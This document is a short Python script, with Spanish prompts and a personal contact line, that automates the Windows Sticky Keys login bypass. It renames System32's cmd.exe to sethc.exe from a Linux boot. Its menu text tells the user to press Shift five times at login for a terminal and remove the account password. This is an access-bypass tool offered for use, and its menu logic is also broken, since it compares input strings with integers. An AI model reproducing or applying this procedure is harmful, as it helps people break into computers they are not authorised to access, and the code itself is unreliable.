import os
print('este escript solo funciona si se ejecuta desde la carpeta raiz y con una distribuciondel disco duro donde se encuentre el sistema windows dado caso que no este copia este escript en la carpeta raiz otra cosa este programa funciona con una distribucion con linux ya que debe de ejecutarse con cualquier distribucion que contenga python ')
print('no me ago responsble del ma uso de este script')

crak=input("""
	      opcion 1: alterar la terminal
	      opcion 2: restaurar la terminal
	      opcion 3: que hacer despues 
	      opcion 4: creditos
	      opcion 5: resetear """)
if crak == 1:
  os.system('mv Windows/System32/cmd.exe Windows/System32/sethc.exe')
  print("listo")
elif crak == 2: 
  os.system('mv Windows/System32/sethc.exe Windows/System32/cmd.exe')
  print ("listo")
elif crak == 3:
  print ("reinicia la pc y entra en windows normalmete al empezar preciona la tecla shift 5 veces y entonces se abrira la terminal de windows si quieres cambiar por ejemplo la clave del equipo escribe en la terminal :control userpasswords2 y podras retirar la clave del equipo una terminal puedes ase muchas cosas de pende de ti a hora  ")

elif crak == 4:
  print("Dabross correo electronico ptb.jair@gmail.com ")
elif crak == 5:
  os.system("reboot")
else:
  print("opcion no valida")  
  